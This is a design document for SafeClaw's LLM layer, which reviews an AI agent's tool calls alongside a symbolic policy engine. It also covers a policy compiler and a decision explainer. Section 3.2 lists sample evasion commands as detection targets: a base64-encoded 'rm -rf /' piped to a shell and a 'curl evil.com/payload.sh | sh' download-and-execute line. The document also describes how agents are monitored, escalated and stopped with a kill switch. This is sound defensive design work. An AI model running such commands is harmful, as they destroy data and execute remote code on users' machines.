# SafeClaw LLM Layer Design

**Date:** 2026-02-28
**Status:** Approved
**Core principle:** LLM observes and advises. Ontology enforces. The LLM never makes allow/block decisions.

---

## 1. Overview

SafeClaw's governance engine is purely symbolic — OWL ontologies, SHACL shapes, regex patterns. This is correct for enforcement: deterministic, auditable, fast. But symbolic systems have blind spots:

1. **Policy authoring is hard** — users must write Turtle (.ttl) files
2. **Rigid pattern matching misses evasion** — base64-encoded commands, multi-step indirect attacks, novel exploits
3. **Decision explanations are machine-readable** — not human-friendly

The LLM layer is a **passive observer and advisor** that sits alongside the symbolic engine. It watches what happens, flags what the rigid rules miss, translates between humans and ontologies, and explains decisions. It never sits in the critical path.

### Design Principles

1. **Passive, not inline** — the LLM never blocks the pipeline or adds latency to tool call evaluation
2. **Advisor, not authority** — the LLM can escalate (flag for confirmation), but cannot override the symbolic engine
3. **Graceful absence** — if no API key is configured, SafeClaw works exactly as before

## 2. LLM Provider

**Mistral** via the `mistralai` Python SDK.

```python
# In SafeClawConfig (config.py)
mistral_api_key: str = ""                    # SAFECLAW_MISTRAL_API_KEY
mistral_model: str = "mistral-small-latest"  # for fast tasks (explain, observe)
mistral_model_large: str = "mistral-large-latest"  # for policy compilation
mistral_timeout_ms: int = 3000
```

Gated: if `mistral_api_key` is empty, all LLM features are disabled. Zero behavior change.

## 3. Four Capabilities

### Role Summary

| Capability | When it runs | Inline? | Can block? | Model |
|---|---|---|---|---|
| **NL → Policy Compiler** | Authoring time (CLI/API) | No | No | mistral-large |
| **Semantic Security Reviewer** | After symbolic decision, parallel | No | Can escalate to confirmation | mistral-small |
| **Classification Observer** | After symbolic decision, async | No | No, suggests updates | mistral-small |
| **Decision Explainer** | On demand (CLI/API) | No | No | mistral-small |

---

### 3.1 Natural Language → Policy Compiler

**Purpose:** Turn English sentences into SHACL shapes and policy triples.

**Flow:**
```
User: "Never let the agent touch .env files"
  → LLM generates Turtle policy block
  → SafeClaw validates generated TTL (syntax + namespace + completeness)
  → If valid: show to user for confirmation, append to safeclaw-policy.ttl, hot-reload KG
  → If invalid: show error, ask user to rephrase
```

**Interface:**
```python
# safeclaw/llm/policy_compiler.py

class PolicyCompiler:
    def __init__(self, client: MistralClient, kg: KnowledgeGraph):
        self.client = client
        self.kg = kg

    async def compile(self, natural_language: str) -> CompileResult:
        """Convert NL policy to Turtle. Returns generated TTL + validation result."""

    async def explain_policy(self, policy_uri: str) -> str:
        """Given a policy URI, generate a human-readable explanation."""

@dataclass
class CompileResult:
    success: bool
    turtle: str              # generated Turtle block
    policy_name: str         # extracted policy name
    policy_type: str         # prohibition | obligation | permission
    validation_errors: list[str]
    explanation: str         # human-readable summary of what the policy does
```

**Prompt strategy:**
- System prompt contains SafeClaw namespace prefixes, the policy schema (Prohibition/Obligation/Permission, PathConstraint, CommandConstraint, TemporalConstraint, DependencyConstraint), and 3-4 few-shot examples from the current `safeclaw-policy.ttl`.
- User message is the natural language policy.
- LLM outputs a fenced Turtle code block.
- SafeClaw parses and validates before persisting.

**Validation pipeline:**
1. Parse TTL with RDFLib (syntax check)
2. Verify all classes/properties used exist in SafeClaw's namespace
3. Verify constraints have a `sp:reason` property
4. Optionally: dry-run against recent audit records to show what it would have blocked

**CLI:**
```bash
safeclaw policy add-nl "Never push to main without running tests first"
# → Generates sp:TestBeforeMainPush prohibition
# → Shows generated TTL for confirmation
# → Appends to policy file on user approval
```

**API:**
```
POST /api/v1/policies/compile
{ "description": "Never push to main without running tests first" }
→ { "turtle": "...", "policyName": "TestBeforeMainPush", "explanation": "..." }

POST /api/v1/policies/apply
{ "turtle": "..." }
→ { "applied": true }
```

**Model:** `mistral-large-latest` — infrequent, benefits from stronger reasoning.

---

### 3.2 Semantic Security Reviewer (the "Red Team" step)

**Purpose:** Catch what rigid symbolic rules miss — obfuscation, indirect attacks, novel exploits, multi-step evasion.

**Why this matters:** The symbolic engine checks what you've explicitly written rules for. But an attacker (or a creative agent) can bypass regex patterns:
- `echo cm0gLXJmIC8= | base64 -d | sh` — base64-encoded `rm -rf /`
- Writing a malicious script to disk, then executing it in a separate step
- `curl evil.com/payload.sh | sh` — download-and-execute
- `git push origin main -f` vs `git push --force origin main` — same intent, different flag order
- Chaining individually-safe actions into a collectively destructive sequence

**Architecture:**
```
Tool call arrives
  → Symbolic engine runs (Steps 1-9, <50ms, deterministic)
  → Symbolic decision returned immediately to agent
  → IN PARALLEL: Semantic Security Reviewer receives (action, params, symbolic decision, session history)
    → LLM analyzes for evasion patterns, obfuscation, semantic risk
    → If suspicious:
       → Log a SecurityFinding to audit trail
       → If severity HIGH: escalate — mark next similar action as "requires confirmation"
       → If severity CRITICAL: trigger kill switch or alert
```

**Interface:**
```python
# safeclaw/llm/security_reviewer.py

class SecurityReviewer:
    def __init__(self, client: MistralClient, engine_ref):
        self.client = client
        self.engine = engine_ref  # for escalation callbacks

    async def review(self, event: ReviewEvent) -> SecurityFinding | None:
        """Async review of a tool call + symbolic decision.
        Returns a finding if suspicious, None if clean."""

@dataclass
class ReviewEvent:
    tool_name: str
    params: dict
    classified_action: ClassifiedAction
    symbolic_decision: str          # "allowed" | "blocked"
    session_history: list[str]      # recent actions for context
    constraints_checked: list[dict] # what the symbolic engine checked

@dataclass
class SecurityFinding:
    severity: str       # "low" | "medium" | "high" | "critical"
    category: str       # "obfuscation" | "evasion" | "multi_step" | "novel_risk"
    description: str    # what the LLM found
    recommended_action: str  # "log" | "escalate_confirmation" | "kill_switch"
    confidence: float   # 0.0-1.0
```

**Prompt strategy:**
- System prompt: "You are a security reviewer for an AI agent governance system. You analyze tool calls that passed symbolic checks to find evasion patterns, obfuscation, or risks the rules missed. You are deliberately paranoid. If something looks safe, say so. If something looks suspicious, explain exactly why."
- Include: the action, params, what the symbolic engine classified it as, what checks passed, and the last 5 actions in the session (for multi-step pattern detection).
- LLM outputs structured JSON: `{suspicious: bool, severity, category, description, recommended_action, confidence}`.
- Temperature 0.

**Escalation behavior:**
- `severity: low` — log the finding, no action
- `severity: medium` — log the finding, flag in audit trail for human review
- `severity: high` — inject a temporary escalation: next action matching this pattern requires user confirmation (via `TempPermissionManager`)
- `severity: critical` — if agent_id exists, trigger kill switch via `AgentRegistry`

**What it catches that regex doesn't:**
- Base64/hex-encoded payloads in shell commands
- Script injection via file write + execute sequences
- Environment variable manipulation to change tool behavior
- URL-based payload delivery (`curl | sh`, `wget | python`)
- Subtle variations of forbidden patterns (flag reordering, aliases)
- Multi-step attacks where each step is individually safe

**Performance:** Runs in parallel via `asyncio.create_task()`. Does not add latency to the symbolic decision. Typical LLM response: 500ms-2s. If it times out, the finding is simply not generated — no impact on the engine.

**Model:** `mistral-small-latest` — fast, cheap. Security review is a classification + reasoning task that benefits from speed over depth.

---

### 3.3 Classification Observer

**Purpose:** Watch how the symbolic classifier handles tool calls and suggest improvements when it falls back to defaults.

**Architecture:**
```
After symbolic decision is made:
  → If classifier returned default ("Action", "MediumRisk"):
    → Observer asks LLM: "How would you classify this?"
    → Logs suggestion to a review queue
    → Human can review and add new patterns to ActionClassifier
```

This is NOT inline. It's a background learning loop that improves the symbolic classifier over time.

**Interface:**
```python
# safeclaw/llm/classification_observer.py

class ClassificationObserver:
    def __init__(self, client: MistralClient, suggestions_file: Path):
        self.client = client
        self.suggestions_file = suggestions_file

    async def observe(self, tool_name: str, params: dict,
                      symbolic_result: ClassifiedAction) -> ClassificationSuggestion | None:
        """If the symbolic classifier used defaults, suggest a better classification."""

@dataclass
class ClassificationSuggestion:
    tool_name: str
    params_summary: str       # sanitized summary, no secrets
    symbolic_class: str       # what the regex said
    suggested_class: str      # what the LLM suggests
    suggested_risk: str
    reasoning: str
    timestamp: str
```

**Output:** Suggestions are appended to `~/.safeclaw/llm/classification_suggestions.jsonl`. A CLI command `safeclaw llm review-suggestions` lets the user accept/reject them, which updates `TOOL_MAPPINGS` or `SHELL_PATTERNS`.

**Model:** `mistral-small-latest`.

---

### 3.4 Decision Explainer

**Purpose:** Turn machine-readable `DecisionRecord` into plain English.

**Interface:**
```python
# safeclaw/llm/explainer.py

class DecisionExplainer:
    def __init__(self, client: MistralClient):
        self.client = client

    async def explain(self, record: DecisionRecord) -> str:
        """Generate a 2-3 sentence explanation of a decision."""

    async def explain_session(self, records: list[DecisionRecord]) -> str:
        """Summarize all decisions in a session."""
```

**Prompt strategy:**
- System: "Explain SafeClaw governance decisions in plain English. Be concise (2-3 sentences). Include: what was attempted, why it was blocked/allowed, which policy applied."
- User message: serialized DecisionRecord.

**Integration:**
- CLI: `safeclaw audit explain <audit-id>`
- API: `GET /api/v1/audit/{id}/explain`
- Context injection: include recent explanations in agent system prompt

**Model:** `mistral-small-latest`.

## 4. Module Structure

```
safeclaw/llm/
├── __init__.py
├── client.py                  # MistralClient wrapper, config, error handling
├── policy_compiler.py         # NL → Turtle policy generation + validation
├── security_reviewer.py       # Parallel semantic security review
├── classification_observer.py # Async classification improvement suggestions
├── explainer.py               # Decision → human-readable explanation
└── prompts.py                 # All prompt templates in one place
```

## 5. Integration into Existing Code

### 5.1 Config (config.py)
```python
# LLM settings
mistral_api_key: str = ""
mistral_model: str = "mistral-small-latest"
mistral_model_large: str = "mistral-large-latest"
mistral_timeout_ms: int = 3000
llm_security_review_enabled: bool = True     # run security reviewer (if key present)
llm_classification_observe: bool = True      # run classification observer (if key present)
```

### 5.2 Full Engine (full_engine.py)
In `_init_components()`:
```python
self.llm_client = None
self.security_reviewer = None
self.classification_observer = None
self.explainer = None

if config.mistral_api_key:
    from safeclaw.llm.client import create_client
    from safeclaw.llm.security_reviewer import SecurityReviewer
    from safeclaw.llm.classification_observer import ClassificationObserver
    from safeclaw.llm.explainer import DecisionExplainer
    self.llm_client = create_client(config)
    self.security_reviewer = SecurityReviewer(self.llm_client, self)
    self.classification_observer = ClassificationObserver(self.llm_client, suggestions_path)
    self.explainer = DecisionExplainer(self.llm_client)
```

In `evaluate_tool_call()`, AFTER the symbolic decision:
```python
# Symbolic pipeline complete, decision made
decision = Decision(block=False, ...)
self.audit.log(record)

# Fire-and-forget LLM tasks (non-blocking)
if self.security_reviewer and config.llm_security_review_enabled:
    asyncio.create_task(self._run_security_review(event, action, decision, record))

if self.classification_observer and action.ontology_class == "Action":
    asyncio.create_task(self._run_classification_observer(event, action))

return decision
```

The pipeline returns immediately. LLM tasks run in background.

### 5.3 API Routes (api/routes.py)
```python
POST /api/v1/policies/compile            # NL → Turtle
POST /api/v1/policies/apply              # Apply generated Turtle
GET  /api/v1/audit/{id}/explain          # Human-readable explanation
GET  /api/v1/audit/session/{id}/explain  # Session summary
GET  /api/v1/llm/findings                # Recent security findings
GET  /api/v1/llm/suggestions             # Classification suggestions
```

### 5.4 CLI (cli/)
```bash
safeclaw policy add-nl "description"        # NL → policy
safeclaw audit explain <audit-id>           # explain a decision
safeclaw audit explain-session <sid>        # explain a session
safeclaw llm findings                       # recent security findings
safeclaw llm review-suggestions             # review/accept classification suggestions
```

## 6. Graceful Degradation

| Scenario | Behavior |
|---|---|
| No Mistral API key | All LLM features disabled. Symbolic-only. Zero behavior change. |
| LLM times out | Security review skipped. Observer skipped. Explainer returns raw reason. |
| LLM rate limited | Same as timeout — graceful skip everywhere. |
| Invalid API key | Log warning at startup, disable LLM features. |

## 7. Testing Strategy

- **Unit tests:** Mock Mistral client, test prompt construction and response parsing
- **Security reviewer tests:** Feed known obfuscated commands, verify findings are generated
- **Policy compiler tests:** Feed known NL → verify generated TTL is valid
- **Observer tests:** Verify it only fires when classifier returns defaults
- **Explainer tests:** Feed known DecisionRecords → verify output includes key phrases
- **Timeout/fallback tests:** Verify all LLM calls respect timeout and degrade gracefully
- **Integration test:** Full pipeline with LLM enabled — verify no latency impact on symbolic decisions

## 8. Dependencies

Add to `pyproject.toml`:
```
mistralai>=1.0.0
```

## 9. Security Considerations

- Mistral API key stored in env vars (`SAFECLAW_MISTRAL_API_KEY`), never in config files
- Policy compiler output is always validated before being applied — LLM cannot inject malformed ontology
- Security reviewer can escalate but cannot directly block — only the symbolic engine blocks
- Audit records sent to explainer may contain command text — users should be aware tool call params go to Mistral's API
- Classification suggestions require human approval before affecting the engine
